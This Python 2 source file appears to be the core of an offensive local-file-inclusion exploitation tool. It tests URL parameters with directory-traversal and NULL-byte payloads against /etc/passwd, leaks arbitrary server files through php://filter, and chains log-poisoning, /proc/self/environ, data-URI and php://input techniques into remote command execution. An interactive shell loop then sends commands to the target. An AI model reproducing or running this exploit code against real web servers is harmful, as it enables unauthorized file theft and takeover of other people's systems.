import re
import requests
# for url parsing
from urlparse import urlparse
# for cookie parsing
import Cookie
# for url encoding
import urllib

# LFI techniques
from core.techniques.LFIHeader import LFIHeader
from core.techniques.LFIApacheLog import LFIApacheLog
from core.techniques.LFIDataURI import LFIDataURI
from core.techniques.LFIPost import LFIPost
from core.techniques.LFISSHLog import LFISSHLog

# string functions
from core.functions import *

class LFI (object):
    def __init__ (self, original_url, replace = 'PAYLOAD', cookies = ''):
        # url submitted by user
        self.original_url = original_url
        # url with replace regexp
        self.pattern_url = original_url
        # replace regexp
        self.payload_placeholder = replace
        # delimiter tags
        self.tag_exec_code = rand_str (20)
        self.tag_start_exec = rand_str (20)
        self.tag_end_exec = rand_str (20)
        self.tag_inclusion = rand_str (20)
        # cookies
        if cookies == '':
            self.cookies = dict ()
        else:
            self.load_cookies (cookies)

        # exec method
        self.exec_method = None

        # read method
        self.read_method = None

        # http method
        self.http_method = 'get'

        # http headers
        # we are IE7
        self.headers = {
                'User-Agent' : 'Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)'
        }

        # post
        self.form = dict ()

        # for path truncation
        self.path_prefix = ''
        self.path_suffix = ''

        # root path
        self.root_path = ''

        # base url
        self.base_url = ''

    # load cookies string
    def load_cookies (self, raw_cookies):
        # parse cookies
        base_cookies = Cookie.BaseCookie()
        base_cookies.load (raw_cookies)
        # rebuild proper simple dictionary
        self.cookies = dict()
        for key, morsel in base_cookies.items():
            self.cookies[key] = morsel.value

    def build_query (self, params, idx_test, test_value):
        idx_name = 1
        query = ''
        test_name = ''
        # build test query with single tested param
        for name, value in params.items():
            if idx_name == idx_test:
                query += name + '=' + test_value
                test_name = name
            else:
                query += name + '=' + value
            # avoid separator ending query
            if idx_name != len (params):
                query += '&'
            idx_name += 1
        
        # add prefix and suffix for path truncation or NULL byte injection
        if self.path_prefix:
            query = self.path_prefix + query
        if self.path_suffix:
            query += self.path_suffix

        # result
        return (test_name, query)

    def do_test (self, method, payload, form = dict()):
        url = self.pattern_url.replace (self.payload_placeholder, payload)
        if method == 'get':
            req = requests.get (url)
        elif method == 'post':
            req = requests.post (url, data=form)
        return req

    # test all params and check vuln
    # TODO : improve inclusion detection
    def find_vuln_param (self):
        # parsing url and separating in elements
        parsed = urlparse (self.original_url)

        # get params
        params = parsed.query.split ('&')
        fields = dict()
        for param in params:
            (name, value) = param.split ('=')
            fields[name] = value

        # test each param for LFI
        found_name = ''
        found_idx_name = 1
        for idx_test in range (1, len (fields) + 1):
            # passwd test with NULL byte injection
            print '[+] Test NULL byte injection'
            (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd\x00')
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # with passwd file
            if len (re.findall ('root:', req.text)) != 0:
                print 'Is vulnerable with param: {0}!'.format (test_name)
                print 'Is vulnerable to NULL byte poisoning'
                found_name = test_name
                found_idx_name = idx_test
                self.path_suffix = '\x00'
                break

            # passwd test with NULL byte injection
            print '[+] Test NULL byte injection'
            (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd\x00.php')
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # with passwd file
            if len (re.findall ('root:', req.text)) != 0:
                print 'Is vulnerable with param: {0}!'.format (test_name)
                print 'Is vulnerable to NULL byte poisoning'
                found_name = test_name
                found_idx_name = idx_test
                self.path_suffix = '\x00.php'
                break

            # passwd test
            print '[+] Test simple inclusion'
            (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd')
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # with passwd file
            if len (re.findall ('root:', req.text)) != 0:
                print 'Is vulnerable with param: {0}!'.format (test_name)
                found_name = test_name
                found_idx_name = idx_test
                break

            # random string test
            print '[+] Test random string inclusion with NULL byte'
            (test_name, query) = self.build_query (fields, idx_test, self.tag_inclusion + '\x00')
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # first with random string
            if len (re.findall ('include\(', req.text)) != 0 and len (re.findall (self.tag_inclusion, req.text)) != 0:
                print 'Is vulnerable with param {0}!'.format (test_name)
                found_name = test_name
                found_idx_name = idx_test
                self.path_suffix = '\x00'
                break

            # random string test
            print '[+] Test random string inclusion'
            (test_name, query) = self.build_query (fields, idx_test, self.tag_inclusion)
            # build test url
            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
            print 'Test url : {0}'.format (url)
            # request test url
            req = requests.get (url, headers=self.headers, cookies=self.cookies)
            # check for inclusion result
            # first with random string
            if len (re.findall ('include\(', req.text)) != 0 and len (re.findall (self.tag_inclusion, req.text)) != 0:
                print 'Is vulnerable with param {0}!'.format (test_name)
                found_name = test_name
                found_idx_name = idx_test
                break

        # rebuild potential vulnerable url
        (test_name, query) = self.build_query (fields, found_idx_name, self.payload_placeholder)

        # rebuild url
        self.base_url = parsed.scheme + '://' + parsed.netloc
        url = self.base_url + parsed.path + '?' + query
        self.base_url += '/'

        # return result if potentially vulnerable
        if len (found_name) == 0:
            return None
        else:
            self.pattern_url = url + self.path_suffix
            return url

    '''
    TODO : implement truncation methods:
    - dot truncation
    - path truncation
    - reverse path truncation
    - NULL byte poisoning
    - good error/correct detection
    '''
    def find_path_truncation (self, url):
        dir_traversals = [
                '../',
                '..\\'
        ]

        # check for path truncation
        for length in range (1, 4097):
            attack = '/.' * length

    # find root path using /etc/passwd as a reference
    def find_root (self):
        max_traversal = 10
        regexp_passwd = re.compile ('root:')
        for count in range (1, max_traversal):
            traversal = '../' * count
            url = self.pattern_url.replace (self.payload_placeholder, traversal + 'etc/passwd')
            req = requests.get (url, cookies=self.cookies)
            if len (regexp_passwd.findall (req.text)) != 0:
                self.root_path = traversal
                return traversal
        return './'

    def do_leak (self, filename):
        php_filter = 'php://filter/convert.base64-encode/resource=' + filename
        url = self.pattern_url.replace (self.payload_placeholder, php_filter)
        req = requests.get (url, cookies=self.cookies)
        print url

        # leak file
        results = scrap_b64str (req.text)
        if len (results) != 0:
            return results

        print '[-] php://filter technique failed'
        print '[+] testing direct injection'
        # we don't use path_prefix so we can read any file easily
        url = self.pattern_url.replace (self.payload_placeholder, filename)
        print url
        req = requests.get (url, cookies=self.cookies)
        return [req.text]


    def do_exec (self, cmd):
        if self.exec_method == None:
            tech = self.check_exec ()
            if tech == None:
                print 'No code exec!'
                return []
            else:
                return tech.exploit (cmd)
        else:
            return self.exec_method.exploit (cmd)

    def check_exec (self):
        print '[+] Testing Data URI command execution'
        # test /proc/self/environ technique
        tech = LFIDataURI (self)
        if tech.check ():
            self.exec_method = tech
            return tech

        print '[+] Testing /proc/self/environ command execution'
        # test /proc/self/environ technique
        tech = LFIHeader (self)
        if tech.check ():
            self.exec_method = tech
            return tech

        print '[+] Testing SSH Log command execution'
        # check if we got code execution through SSH logs
        tech = LFISSHLog (self)
        if tech.check ():
            self.exec_method = tech
            return tech

        print '[+] Testing php://input command execution'
        # test php://input technique
        tech = LFIPost (self)
        if tech.check ():
            self.exec_method = tech
            return tech

        print '[+] Testing Apache Log command execution'
        # check if we got code execution through apache logs
        tech = LFIApacheLog (self)
        if tech.check ():
            self.exec_method = tech
            return tech

        return None

    def do_shell (self):
        result = []
        while True:
            cmd = raw_input ('cmd : ')
            if cmd == 'exit':
                break
            # exec cmd
            results = self.do_exec (cmd)
            # show output
            for result in results:
                print result

